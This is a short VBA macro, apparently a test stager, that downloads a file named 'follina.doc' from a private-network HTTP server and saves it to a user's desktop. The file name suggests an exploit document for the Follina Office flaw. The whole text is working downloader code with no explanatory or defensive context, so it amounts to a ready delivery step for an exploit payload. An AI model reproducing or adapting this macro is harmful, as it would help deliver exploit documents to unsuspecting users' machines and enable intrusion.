Sub DownloadFile(URL As String, LocalFilename As String)
    Dim oXMLHTTP As Object
    Dim oStream As Object
    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    oXMLHTTP.Open "GET", URL, False
    oXMLHTTP.Send

    If oXMLHTTP.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write oXMLHTTP.ResponseBody
        oStream.SaveToFile LocalFilename, 2 ' 1 = no overwrite, 2 = overwrite
        oStream.Close
    End If
End Sub


Sub aaa()
    
    DownloadFile "http://192.168.94.140:8848/follina.doc", "C:\Users\Old Green\Desktop\aa.doc"
End Sub

